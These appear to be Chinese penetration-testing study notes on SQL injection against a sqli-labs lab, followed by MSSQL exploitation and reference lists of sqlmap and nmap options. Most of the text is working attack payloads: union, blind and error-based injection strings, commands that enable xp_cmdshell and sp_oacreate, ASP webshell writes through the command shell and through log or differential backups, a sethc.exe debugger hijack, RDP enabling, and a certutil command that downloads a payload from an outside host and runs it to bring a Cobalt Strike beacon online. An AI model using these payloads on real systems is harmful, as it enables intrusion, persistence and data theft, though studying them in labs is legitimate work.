![image-20240820184345026](学习/笔记/assets/image-20240820184345026.png)

- 获取表名(emails,referers,uagents,users)

```sql
http://192.168.77.131/master/Less-1/?id=1'and (extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))) --+
```

![image-20240820184921277](学习/笔记/assets/image-20240820184921277.png)

- 获取字段名(id,username,password)

```sql
http://192.168.77.131/master/Less-1/?id=1'and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x3a)) --+
```

![image-20240820194718757](学习/笔记/assets/image-20240820194718757.png)

- 获取数据(好像只能获取2两条数据)

```sql
http://192.168.77.131/master/Less-1/
?id=1' and extractvalue(1, concat(0x3a,(select group_concat(id, 0x3a, username, 0x3a, password) from security.users),0x3a)) --+
```

![image-20240820195336227](学习/笔记/assets/image-20240820195336227.png)

- 使用union获取所有数据

```sql
http://192.168.77.131/master/Less-1/?id=-1' UNION SELECT 1, (SELECT group_concat(id, 0x3a, username, 0x3a, password SEPARATOR 0x0a) FROM security.users), 3 --+
```

![image-20240820195416224](学习/笔记/assets/image-20240820195416224.png)

### 布尔盲注

- 判断数据库名字长度(使用``<``,``>``,``=``判断,过程省略了,这里判断为8-->``security``)

```sql
http://192.168.77.131/master/Less-1/?id=1'and (length(database()))=8 --+
```

![image-20240820200601248](学习/笔记/assets/image-20240820200601248.png)

- 构造pyload进行密码爆破(使用burp)

![image-20240820200817160](学习/笔记/assets/image-20240820200817160.png)

![image-20240820200917513](学习/笔记/assets/image-20240820200917513.png)

![image-20240820200943027](学习/笔记/assets/image-20240820200943027.png)

- 开始攻击

![image-20240820201050012](学习/笔记/assets/image-20240820201050012.png)

- 根据顺序得到--> 115 101 99 117 114 105 116 121 即为:``security``

- 然后开始获取数据库表的``数目``(跟前面判断数据库的字符数是一样的,这里有``4张``表)

```sql
http://192.168.77.131/master/Less-1/?id=1'and (select count(*) from information_schema.tables where table_schema=database())=4 --+
```

- 获取第一个表的``表名长度``(6个字段)

```sql
http://192.168.77.131/master/Less-1/?id=1' and (select LENGTH(table_name) from information_schema.tables where table_schema=database() limit 0,1) =6--+
```

- 获取第二个表的``表名长度``(8个字段)

```sql
http://192.168.77.131/master/Less-1/?id=1' and (select LENGTH(table_name) from information_schema.tables where table_schema=database() limit 1,1) =8 --+
```

- 获取第三个表的``表名长度``(7个字段)

```sql
http://192.168.77.131/master/Less-1/?id=1' and (select LENGTH(table_name) from information_schema.tables where table_schema=database() limit 2,1) =7 --+
```

- 获取第四个表的``表名长度``(5个字段)-->``users``

```sql
http://192.168.77.131/master/Less-1/?id=1' and (select LENGTH(table_name) from information_schema.tables where table_schema=database() limit 3,1) =5 --+
```

- 获取``表名``--> 117 115 101 114 115 即:``users``

![image-20240820205508239](学习/笔记/assets/image-20240820205508239.png)

- 获取字段名(我们只需要获取到数据库名和表名即可,然后用其它方式获取数据)

```sql
http://192.168.77.131/master/Less-1/?id=1'and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x3a)) --+
```

- 使用union获取所有数据

```sql
http://192.168.77.131/master/Less-1/?id=-1' UNION SELECT 1, (SELECT group_concat(id, 0x3a, username, 0x3a, password SEPARATOR 0x0a) FROM security.users), 3 --+
```

### 时间盲注(这里使用yakit,个人比较喜欢)

- 获取``数据库名长度``-->8

```
http://192.168.77.131/master/Less-1/?id=1'and if(length(database())=8,sleep(5),0) --+ 
```

- 获取``数据库名字``-->security

```sql
//获取数据库名字if(ascii(substring((select database()),1,1))=115,sleep(5),0)
//database(),1,1 第一个``1``表示从数据库名称的第一个字符开始,第二个``1``表示要截取的字符长度为1，即只获取第一个字符

http://192.168.77.131/master/Less-1/?id=1'and if(ascii(substring((select database()),1,1))=115,sleep(5),0)--+
```

![image-20240821100550904](学习/笔记/assets/image-20240821100550904.png)

- 获取该``数据库中表的数目``-->4

```sql
http://192.168.77.131/master/Less-1/?id=1'and if((select count(*) from information_schema.tables where table_schema=database())=4,sleep(5),0)--+
```

- 获取第四张表的``表名长度``-->5

```sql
http://192.168.77.131/master/Less-1/?id=1' AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1) = 5, SLEEP(5), 0) --+
```

- 获取第四张表的``表名``(构造payload爆破)

```sql
http://192.168.77.131/master/Less-1/?id=1'and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=101,sleep(5),0) --+
```

![image-20240821125906232](学习/笔记/assets/image-20240821125906232.png)

![image-20240821130001706](学习/笔记/assets/image-20240821130001706.png)

- 依次为:117 115 101 114 115 即:``users``

- 这里就写详细些,把字段名也爆破出来

```sql
//users表的字段数-->3 也即是说在users表中有三个字段
http://192.168.77.131/master/Less-1/?id=1'and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1))=3,sleep(5),0) --+
```

- 获取``字段数``

```sql
//第一个字段长度为2
http://192.168.77.131/master/Less-1/?id=1' and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1) limit 0,1)=2,sleep(5),0) --+
```

```sql
//第二个字段长度为8
http://192.168.77.131/master/Less-1/?id=1' and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1) limit 1,1)=8,sleep(5),0) --+
```

```sql
//第三个字段长度为8
http://192.168.77.131/master/Less-1/?id=1' and if((select length(column_name) from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1) limit 2,1)=8,sleep(5),0) --+
```

- 开始爆破``users``每一个字段名

```sql
//获取第一个字段名 105 100 -->对应id
http://192.168.77.131/master/Less-1/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1) limit 0,1),1,1))=97,sleep(5),0) --+
```

![image-20240821145440777](学习/笔记/assets/image-20240821145440777.png)

```sql
//获取第二个字段名 对应 117 115 101 114 110 97 109 101-->username
http://192.168.77.131/master/Less-1/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1) limit 1,1),1,1))=97,sleep(5),0) --+
```

![image-20240821150224702](学习/笔记/assets/image-20240821150224702.png)

```sql
//获取第三个字段名 对应 112 97 115 115 119 111 114 100 -->password
http://192.168.77.131/master/Less-1/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=(select table_name from information_schema.tables where table_schema=database() limit 3,1) limit 1,1),2,1))=97,sleep(5),0) --+
```

![image-20240821150707118](学习/笔记/assets/image-20240821150707118.png)

- 至此``数据库名:security``,``表名:users``,``字段名:id,username,password``均获取到了,数据就不展示了!

------



# Mssql

- `SQL Server` 默认开放的端口是`TCP 1433`
- 利用总结

```cmd
1.SQL注入查询登录用户Hash
//id=0'union select 1,2,(select master.dbo.fn_varbintohexstr(password_hash) from sys.sql_logins where name='sa') --+

2.扩展存储过程 xp_cmdshell 执行命令
3.系统存储过程 sp_oacreate+sp_oamethod 执行命令
4.扩展存储过程 xp_regwrite 写注册表 (映像劫持,远程桌面,开机启动项等)
5.利用 CLR 组件执行系统命令
6.系统存储过程 sp_addextendedproc 恢复组件
7.差异备份写 webshell
8.日志备份写 webshell
```

- ![image-20240908100608500](./assets/image-20240908100608500-1725772774478-2.png)
- 视图和表的关系:`数据表`是真实存在的,有效数据,视图相当于固定的sql语句,当打开视图就执行其sql语句.视图多为几个表的关系联合表达,有助于封装复杂的关系
- MSSql数据库级别设置:`服务器级->数据库级->架构级->数据对象级`

```sql
Server.DataBase1.dbo.Table1;
//这里的意思是Table1这个表属于dbo这个架构,dbo这个架构属于DataBase1这个数据库,DataBase1这个表属于Server这个服务器
```

- MSSql的`默认库`:`master,model,tempdb,msdb`

```cmd
1.master数据库(重要):master数据库控制SQL Server的所有方面,这个数据库包含所有的配置信息,用户登录信息,当前正在服务器运行的过程信息
2.model数据库:model数据库是建立所有用户数据库时的模板,当建立一个新数据库时,SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中.在模板对象被拷贝到新的数据库之后,该数据库的所有多余对象都将被空页填满
3.tempdb数据库:这个库用来存储所有的临时表,存储过程和其它SQL Ssrver建立临时用的东西
4.msdb数据库:由 Enterprise Manager 和 Agent 使用,记录着任务计划信息,事件处理信息,数据备份和恢复信息,警告及异常信息
```

- 基本语句

```cmd
MSSql的基本语句：
创建数据库：CREATEDATABASE[dbname]
删除数据库：dropdatabase[dbname]
创建新表：createtable[tablename](namechar(10),agetinyint,sexint)
删除新表：droptable[tablename]
向表中插入内容：insertinto[tablename](field1,field2）values(value1,value2）
删除内容：deletefrom[tablename]where范围
更新内容：update[tablename]setfield1=value1where范围
查找：select*from[tablename]wherefield1=”ichunqiu”
```

- 权限控制

![image-20240905154641662](./assets/image-20240905154641662.png)

![image-20240905154730644](./assets/image-20240905154730644.png)

- 视图表

|           视图表           |                       说明                        |
| :------------------------: | :-----------------------------------------------: |
|       sys.databases        |             SQL Server中的所有数据库              |
|       sys.sql_logins       |             SQL Server中所有的登录名              |
| information_schema.tables  |                 当前数据库中的表                  |
| information_schema.columns |               当前用户数据库中的列                |
|      sys.all_columns       |       用户定义对象和系统对象的所有列的联合        |
|  sys.database_principals   |           数据库中每个权限或列异常权限            |
|     sys.database_files     |            存储在数据库中的数据库文件             |
|         sysobjects         | 数据库中创建的每个对象(例如约束,日志以及存储过程) |

- `数据外带`

------



![image-20240906093005209](./assets/image-20240906093005209-1725772774478-1.png)

------

![image-20240906093035218](./assets/image-20240906093035218-1725761517519-1-1725772774478-3.png)

------

![image-20240906093149335](./assets/image-20240906093149335-1725761526059-3-1725772774479-4.png)

------

![image-20240906093227478](./assets/image-20240906093227478-1725761532229-5-1725772774479-5.png)

------

![image-20240906093328522](./assets/image-20240906093328522-1725761535569-7-1725772774479-7.png)

------

![image-20240906093345428](./assets/image-20240906093345428-1725761539725-9-1725772774479-6.png)

------

![image-20240906093436865](./assets/image-20240906093436865-1725761542852-11-1725772774479-8.png)

------

![image-20240906093454776](./assets/image-20240906093454776-1725761546236-13-1725772774479-9.png)

------

![image-20240906093510410](./assets/image-20240906093510410-1725761548915-15-1725772774479-10.png)

------

![image-20240906093419513](./assets/image-20240906093419513-1725761551670-17-1725772774479-11.png)

------

![image-20240906093401627](./assets/image-20240906093401627-1725761554967-19-1725772774479-12.png)

------

#### MSSql扩展存储过程

- 存储过程是为了完成特定功能的`sql语句`集合,经编译后存储于数据库中,用户通过指定存储过程的名称并给出参数来执行.存储过程中可以包含逻辑控制语句和数据操纵语句,它可以接受参数,输出参数,返回单个或多个结果集以及返回值
- 由于存储过程在创建时即在数据库服务器上进行了编译并存储在数据库中,所以存储过程运行要比单个sql语句块要快,同时由于在调用时只需用提供存储过程名和必要的参数信息,所以在一定程度上也可以减少网络流量,减轻网络负担
- 存储过程分为:`系统存储`,`本地存储`,`扩展存储`,`远程存储`,`临时存储`过程

------



#### 系统存储过程

- 以`sp_`开头,进行系统的设定,如:`sp_oacreate`,`sp_oamethod`

- 利用`条件`

  - 1.已获得`sqlserver sysadmin权限`的用户,且账号与密码未降权

  - 2.sqlserver允许`远程连接`

  - `OLE Automation Procedures`选项开启

    `sp_oacreate`是创建OLE对象的实例

    `sp_oamethod`是调用一个OLE对象的方法

    组合`sp_oacreate`,`sp_oamethod`可执行命令无回显

  ```sql
  #启用sp_oacreate
  EXEC sp_configure 'show advanced options',1;
  RECONFIGURE WITH OVERRIDE;
  EXEC sp_configure 'Ole Automation Procedures',1;
  RECONFIGURE WITH OVERRIDE;
  
  #利用mssql定义变量shell调用wscript.shell利用cmd.exe /c 执行命令并写入文件
  declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c whoami > c://1.txt'
  
  #写一句话木马webshell
  declare @o int,@f int,@t int,@ret int
  exec sp_oacreate 'scripting.filesystemobject',@o out
  exec sp_oamethod @o,'createtextfile',@f out,'c:/inetpub/wwwroot/shell.asp',1
  exec @ret=sp_oamethod @f,'writeline',NULL,'<%execute(request("cmd"))%>'
  
  #组合sp_oacreate和sp_oamethod利用com组件执行命令
  declare @luan int,@exec int,@text int,@str varchar(8000);
  exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;
  exec sp_oamethod @luan,'exec',@exec output,'C:/windows/system32/cmd.exe /c whoami';
  exec sp_oamethod @exec,'StdOut',@text out;exec sp_oamethod @text,'readall',@str out;
  select @str;
  
  #SharpSQLTools工具利用sp_oacreate执行命令
  SharpSQLTools.exe 192.168.1.1 tomato tomato master enable_ole
  SharpSQLTools.exe 192.168.1.1 tomato tomato master sp_oacreate whoami
  ```

------



#### 本地存储过程

- 本地存储过程指用户创建的自定义存储过程.如:`CLR`

- `CLR`:公共语言基础结构(Common Language Infrastructure),用来支持不同的编程语言.sql server集成了该组件,可以通过sql server执行编写CLR执行系统命令

- SharpSQLTools实现上传下载文件,`xp_cmdshell`与`sp_oacreate`双回显和clr加载程序执行响应的操作

- ```sql
  #SharpSQLTools.exe 192.168.1.1 tomato tomato master install_clr
  #SharpSQLTools.exe 192.168.1.1 tomato tomato master enable_clr
  #SharpSQLTools.exe 192.168.1.1 tomato tomato master clr_efspotato whoami
  ```

  ##### xp_cmdshell`利用`

  - 当前用户拥有`DBA权限`
  - 依赖于`xplog70.dll`
  - 存储过程`存在`并`已启用`

- xp_cmdshell存储过程可以执行系统命令,默认支持输出执行结果

- 从`MSSQL_2005`版本之后默认处于禁用状态,可以使用`sp_configure`来启用或者禁用`xp_cmdshell`

```sql
#xp_cmdshell利用

#判断当前是否为DBA权限,返回1即为sysadmin
select IS_SRVROLEMEMBER('sysadmin');
#查看是否存在xp_cmdshell,返回1则存在
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshellhell'
#开启xp_cmdshell
EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
#关闭xp_cmdshell
EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;


#SQL注入+xp_cmdshell利用

#查看是否禁用xp_cmdshell
id=0'union select 1,2,count(*) from master..sysobjects where xtype='X' and name='xp_cmdshell' --+ 
id=1'and 1=(select count(*) from master.sys.sysobjects where name='xp_cmdshell') --+

#开启cmdxp_cmdshell
id=0';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; --+

#执行命令
id=1';exec master.sys.xp_cmdshell 'ping -n 1 d3rymk.dnslog.cn' --+
```

![image-20240906193747809](./assets/image-20240906193747809.png)

------



#### 扩展存储过程

- 扩展存储过程以`xp`开头,主要使用外部程序语言编写的存储过程

- 如:`xp_cmdshell`直接利用其执行命令,`xp_subdirs`读取文件夹内容

- `sql server 2005` 后的版本默认关闭,需要开启后使用

- ```sql
  #开启xp_cmdshell
  EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
  
  #执行系统命令
  exec master..xp_cmdshell 'whoami'
  #查询web根目录路径
  exec master..xp_cmdshell 'where /r c:/ *.asp'
  #利用xp_cmdshell写webshell-->`^`为转义符
  exec master..xp_cmdshell 'echo ^<%eval request("cmd")%^> > c:/inetpub/wwwroot/shell.asp' -->找web绝对路径可利用where命令和其它扩展存储过程组合利用
  
  #利用xp_cmdshell开启3389
  http://192.168.1.1/Less-1.asp?id=1'exec xp_cmdshell 'REG ADD HKLM/SYSTEM/CurrentControlSet/Control/Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' --+
  
  #执行命令写入web根目录或者反弹shell
  http://192.168.1.1/Less-1.asp?id=1';exec xp_cmdshell 'systeminfo > c:/inetpub/wwwroot/systeminfo.txt' --+
  
  #执行命令写入webshell
  http://192.168.1.1/Less-1.asp?id=1';exec master..xp_cmdshell 'echo ^<%eval request("cmd")%^> > c:/inetpub/wwwroot/shell.asp'
  
  #----------------------------------------------->xp_cmdshell执行powershell命令上线CS<-----------------------------------------------
  
  http://192.168.1.1/Less-1.asp?id=1';exec master..xp_cmdshell 'certutil.exe -f -split -urlcache http://192.168.172.129:9090/payload64.txt c://inetpub//wwwroot//payload1.bat' --+
  
  http://192.168.1.1/Less-1.asp?id=1';exec master..xp_cmdshell 'c://inetpub//wwwroot//payload1.bat' --
  -----------------------------------------------------------------------------------------------------------------------------------
  
  #SharpSQL Tools.exe 利用 xp_cmdshell
  SharpSQLTools.exe 192.168.1.1 tomato tomato master enable_xp_cmdshell
  SharpSQLTools.exe 192.168.1.1 tomato tomato master xp_cmdshell whoami
  
  #删除xp_cmdshell存储过程
  exec sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll' declare @o int;
  sp_addextendedproc 'xp_cmdshell','xpsql70.dll';  --> 若彻底删除C盘删
  
  #查询指定文件夹的文件列表
  exec master..xp_subdirs 'c:/';
  
  #显示当前目录的子目录xp_dirtree
  - directory :第一个参数是要查询的目录
  - depth :第二个参数是显示子目录深度,默认是0,显示所有子目录
  - file :第三个参数是bool类型,指定是否显示子目录中的文件,默认是0,表示不显示任何文件,只显示子目录
  
  exec master..xp_dirtree 'c:/';		//显示c盘所有文件和目录
  exec master..xp_dirtree 'c:/',1';	//显示c盘所有目录
  exec master..xp_dirtree 'c:/',1,1;	//显示指定目录下的目录和文件
  
  #xp_create_subdir创建子目录
  exec master..xp_create_subdir 'c:/test';
  
  #xp_fileexist判断文件是否存在
  exec master..xp_fileexist 'c:/windows/win.ini';
  
  #使用xp_regwrite存储过程对注册表近蜥形修改,替换成任意值,造成镜像劫持
  -前提条件
  - 1.未禁止注册表编辑
  - 2.xp_regwrite启用
  #查看xp_regwrite是否启用
  select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite';
  
  #开启xp_regwrite
  exec sp_configure 'show advanced options',1 RECONFIGURE
  exec sp_configure 'xp_regwrite',1 RECONFIGURE
  
  #利用regwrite修改注册表进行劫持
  exec master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE/Microsoft/WindowsNT/CurrentVersion/Image File Executio Options/sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:/windows/system32/cmd.exe'
  
  #利用regwrite开启3389端口
  exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM/CurrentControlSet/Control/Terminal Server','fDenyTSConnections','REG_DWORD',0;
  exec master..xp_cmdshell "REG ADD 'HKEY_LOCAL_MACHINE','SYSTEM/CurrentControlSet/Control/Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0"
  
  #利用xp_regread对注册表进行读取
  -读取注册查看是否修改成功
  exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE/Microsoft/WindowsNT/CurrentVersion/Image File Execution Options/sethc.exe','Debugger'
  
  #通过扩展存储过程拿shell
  - 前提
  - 数据库是db_owner权限
  - 涉及到的存储扩展过程:xp_cmdshell,xp_dirtree,xp_subdirs,xp_regread,xp_ntsec_enumdomains(查看domain信息)
  ```

------

#### 小结

- 条件:已知`web路径`,`sa或dba权限`

- 利用本地存储过程写shell

- xp_cmdshell

- ```sql
  exec master..xp_cmdshell 'echo ^<%eval request("cmd")%^> > c:/inetpub/wwwroot/shell.asp';
  ```

- sp_oacreate

- ```sql
  declare @o int,@f int,@t int,@ret int
  exec sp_oacreate 'scripting.filesystemobject',@o out
  exec sp_oamethod @o,'createtextfile',@f out,'c:/inetpub/wwwroot/shell.asp',1
  exec @ret=sp_oamethod @f,'writeline',NULL,'<%execute(request("cmd"))%>'
  ```

- 本地存储过程CLR:直接利用sharpsqltools执行命令写shell进行利用

- `log备份`写shell

- ```sql
  #优点
  - 重复性好,多次备份成功率高
  - 相对于差异备份而言,shell的体积较小
  
  #利用条件
  - DBO权限,默认SA也可
  - 知道绝对路径,并且可写
  - 站库不分离,数据库跟网站在同一台服务器
  - 数据库必须被备份过一次
  
  use test;	//选中数据库
  alter database test set recovery full;	//设置恢复模式
  if exists(select table_name from information_schema.tables where table_name='test_tmp') drop table test_tmp;
  create table test_tmp (a image);	//新建临时表
  backup log test to disk = 'C://inetpub//wwwroot//asp.bak' with init;	//备份日志到指定路径
  insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253EDA);
  backup log test to disk = 'C://inetpub//wwwroot//123.asp'; -->连接`蚁剑`密码为a
  ```

- `差异备份`写shell

- ```sql
  #差异备份条件
  - dbo权限
  - 知道绝对路径,可写
  - http 500 错误不是自定义
  - web和数据库在一块.还有的就是数据库不能存在%号特殊字符
  - 数据量不能太大
  - Tips: 差异备份写shell容错率相对较差,通常利用存储过程日志备份写shell更为快捷键
  
  use test;	//选中库
  backup database test to disk = 'c://inetpub//wwwroot//mssql1.bak';	//手动备份一次
  create table test..test1(a image);	//新建临时表
  insert into test..test(a) values (0x3C25657865637574652872657175657374282261222929253EDA);	//插入一句话木马到表中,注意16进制
  backup database test to disk = 'c://inetpub//wwwroot//shell.asp' with differential.format;	//进行差异化备份
  drop table test..test1;	//备份完getshell后删除表
  ```


------

# sqlmap

### 基本用法

```bash
sqlmap -u <URL> [options]
```

`-u` 参数指定要扫描的目标 URL，后面可以跟各种选项以实现不同的功能。

### 常用选项列表

#### 1. **Target (目标)**

- `-u URL, --url=URL`：指定目标 URL。
- `-d DIRECT, --direct=DIRECT`：直接连接数据库（如 `mysql://user:pass@host/dbname`）。
- `-r REQUESTFILE, --request=REQUESTFILE`：使用保存的 HTTP 请求文件。
- `--method=METHOD`：指定 HTTP 请求方法（GET, POST, PUT, etc）。
- `--data=DATA`：指定 POST 数据。
- `--cookie=COOKIE`：指定 HTTP Cookie 头。
- `--headers=HEADERS`：指定额外的 HTTP 头。
- `--auth-type=AUTH`：指定 HTTP 基本认证或摘要认证类型。
- `--auth-cred=AUTH`：指定认证凭证 (e.g. `user:pass`)。

#### 2. **Detection (检测)**

- `--level=LEVEL`：扫描等级（1-5），默认值为 1。
- `--risk=RISK`：风险等级（1-3），默认值为 1。
- `--string=STRING`：匹配响应中的字符串。
- `--regexp=REGEXP`：匹配响应中的正则表达式。
- `--text-only`：基于文本内容的对比。
- `--titles`：基于 HTTP 标题的对比。

#### 3. **Techniques (技术)**

- `--technique=TECH`：指定 SQL 注入技术（B: Blind, E: Error, U: Union, S: Stacked queries, T: Time-based）。
- `--time-sec=TIMESEC`：指定时间延迟（以秒为单位）。
- `--union-cols=UCOLS`：指定 UNION 查询的列数。
- `--union-char=UCHAR`：指定 UNION 查询使用的字符。

#### 4. **Enumeration (枚举)**

- `-a, --all`：检索所有信息。
- `--banner`：检索数据库的标识。
- `--current-user`：检索当前数据库用户。
- `--current-db`：检索当前数据库。
- `--is-dba`：检测当前用户是否为 DBA。
- `--users`：枚举数据库用户。
- `--passwords`：枚举数据库用户密码。
- `--privileges`：枚举用户权限。
- `--roles`：枚举用户角色。
- `--dbs`：枚举数据库。
- `--tables`：枚举数据库中的表。
- `--columns`：枚举表中的列。
- `--schema`：检索数据库结构。
- `--count`：检索表中的记录数。

#### 5. **Brute-force (暴力破解)**

- `--common-tables`：暴力破解常见表名。
- `--common-columns`：暴力破解常见列名。
- `--brute-force`：使用暴力破解方式尝试其他注入点。

#### 6. **User-defined Function Injection (用户自定义函数注入)**

- `--udf-inject`：注入用户自定义函数。
- `--shared-lib=SHLIB`：指定共享库路径。

#### 7. **Access to the File System (访问文件系统)**

- `--file-read=RFILE`：读取远程文件。
- `--file-write=WFILE`：写入本地文件到远程文件系统。
- `--file-dest=DFILE`：指定远程文件路径。
- `--os-shell`：获得操作系统 Shell。
- `--os-pwn`：获得操作系统访问权限。
- `--os-smbrelay`：执行 SMB 中继攻击。
- `--os-bof`：执行缓冲区溢出攻击。
- `--os-cmd=OSCMD`：执行操作系统命令。

#### 8. **Takeover (接管)**

- `--os-shell`：获得一个操作系统 shell。
- `--os-pwn`：通过 Meterpreter 反向连接获得控制。
- `--os-smbrelay`：进行 SMB 中继攻击。
- `--os-bof`：执行缓冲区溢出攻击。

#### 9. **General (一般)**

- `--batch`：不提示用户确认，自动执行操作。
- `--flush-session`：清除目标 URL 的会话文件。
- `--threads=THREADS`：设置并发线程数。
- `--time-sec=TIMESEC`：设置时间基准延迟时间。
- `--retries=RETRIES`：设置 HTTP 请求重试次数。

#### 10. **Miscellaneous (杂项)**

- `--proxy=PROXY`：使用 HTTP 代理。
- `--tor`：使用 Tor 网络来隐藏 IP。
- `--tor-type=TYPE`：指定 Tor 使用的代理类型 (HTTP, SOCKS4, SOCKS5)。
- `--check-tor`：检测 Tor 是否正常工作。
- `--delay=DELAY`：设置 HTTP 请求之间的延迟时间。
- `--timeout=TIMEOUT`：设置 HTTP 请求超时时间。
- `--safe-url=SAFEURL`：提供安全的 URL 进行请求。
- `--safe-freq=SAFEREQ`：执行指定次数后访问安全的 URL。

#### 11. **Output (输出)**

- `--output-dir=ODIR`：设置输出目录。
- `--disable-coloring`：禁用终端的彩色输出。
- `--parse-errors`：解析 HTTP 响应错误消息。

### 实例操作

- **扫描并枚举数据库：**

  ```bash
  sqlmap -u "http://example.com/vuln.php?id=1" --dbs
  ```

- **扫描并获取当前用户：**

  ```bash
  sqlmap -u "http://example.com/vuln.php?id=1" --current-user
  ```

- **联合查询注入，获取表：**

  ```bash
  sqlmap -u "http://example.com/vuln.php?id=1" --tables
  ```

- **暴力破解数据库表：**

  ```bash
  sqlmap -u "http://example.com/vuln.php?id=1" --common-tables
  ```

`Nmap`（Network Mapper）是一个用于网络发现和安全审计的开源工具。以下是 `Nmap` 的常用命令行选项和语法的详细列表。

### 基本用法

```bash
nmap [Scan Type(s)] [Options] {target specification}
```

### 常用选项列表

#### 1. **目标指定 (Target Specification)**

- `nmap <target>`：扫描目标 IP 地址或域名。
- `nmap <target1> <target2> ...`：扫描多个目标。
- `nmap <range>`：扫描 IP 地址范围 (e.g., `nmap 192.168.1.1-254`)。
- `nmap <CIDR>`：使用 CIDR 表示法指定网络 (e.g., `nmap 192.168.1.0/24`)。
- `nmap -iL <inputfile>`：从文件中读取目标列表。
- `nmap -iR <num hosts>`：随机扫描指定数量的主机。
- `nmap -exclude <target1>[,<target2>,...]`：排除特定主机。
- `nmap -exclude-file <exclude_file>`：从文件中排除特定主机。

#### 2. **扫描类型 (Scan Type)**

- `-sS`：TCP SYN 扫描（半开放扫描）。
- `-sT`：TCP Connect 扫描（完全开放扫描）。
- `-sU`：UDP 扫描。
- `-sA`：ACK 扫描。
- `-sW`：窗口扫描。
- `-sM`：Maimon 扫描。
- `-sN`：TCP Null 扫描。
- `-sF`：TCP FIN 扫描。
- `-sX`：Xmas 扫描。
- `-sC`：使用默认脚本扫描。
- `-sV`：版本探测，检测服务版本。
- `-sP`：Ping 扫描。
- `-sn`：Ping 扫描，不进行端口扫描。
- `-sO`：IP 协议扫描。
- `-sI`：Idle 扫描。
- `-sL`：列表扫描，仅列出目标，不进行扫描。
- `-sY`：SCTP INIT 扫描。
- `-sZ`：SCTP COOKIE-ECHO 扫描。

#### 3. **端口指定 (Port Specification)**

- `-p <port ranges>`：指定端口范围 (e.g., `-p 22`, `-p 1-100`, `-p U:53,T:21-25` for UDP and TCP)。
- `-F`：快速扫描，仅扫描 100 个最常用的端口。
- `--top-ports <number>`：扫描最常用的 N 个端口。
- `-r`：不随机化扫描端口顺序。

#### 4. **服务和版本探测 (Service and Version Detection)**

- `-sV`：检测开放端口上的服务版本。
- `--version-intensity <level>`：设置版本探测强度（0-9，默认值为 7）。
- `--version-light`：更快速、更轻量级的版本探测。
- `--version-all`：尝试所有探测方法（更耗时）。
- `--version-trace`：显示版本探测过程中发送和接收的详细信息。

#### 5. **OS 检测 (OS Detection)**

- `-O`：启用操作系统检测。
- `--osscan-limit`：仅对已检测到至少一个开放或过滤端口的目标进行操作系统检测。
- `--osscan-guess`：尝试猜测操作系统。

#### 6. **脚本引擎 (Nmap Scripting Engine - NSE)**

- `-sC`：使用默认脚本扫描（同 `--script=default`）。
- `--script=<script>`：使用特定的脚本。
- `--script=<category>`：使用某一类别的脚本。
- `--script-args=<n1=v1,[n2=v2,...]>`：传递给脚本的参数。
- `--script-trace`：显示发送给脚本的数据包。

#### 7. **输出选项 (Output Options)**

- `-oN <file>`：将结果以普通格式输出到文件。
- `-oX <file>`：将结果以 XML 格式输出到文件。
- `-oS <file>`：将结果以脚本格式输出到文件。
- `-oG <file>`：将结果以可 grep 格式输出到文件。
- `-v`：详细模式。
- `-vv`：更详细的模式。
- `-d`：调试模式。
- `-dd`：更详细的调试模式。
- `--open`：仅显示开放的端口。
- `--packet-trace`：显示发送和接收的数据包。

#### 8. **防火墙/IDS 规避和伪装 (Firewall/IDS Evasion and Spoofing)**

- `-f`：使用小的分段包发送（分段扫描）。
- `-D RND:10`：使用随机的 10 个源 IP 地址进行扫描（伪装源 IP）。
- `-S <IP_Address>`：伪装源 IP 地址。
- `-e <interface>`：指定网络接口。
- `-g <port>`：指定源端口。
- `--source-port <port>`：指定源端口。
- `--data-length <number>`：在每个数据包中添加随机数据以混淆扫描。
- `--ip-options <options>`：发送带有指定选项的 IP 包。
- `--ttl <value>`：设置 IP 包的 TTL 值。
- `--spoof-mac <MAC address/prefix/vendor name>`：伪装 MAC 地址。

#### 9. **时间和性能选项 (Timing and Performance Options)**

- `-T<0-5>`：设置扫描时间（0 为最慢，5 为最快，默认值为 3）。
- `--min-hostgroup <size>`：设置最小主机组大小。
- `--max-hostgroup <size>`：设置最大主机组大小。
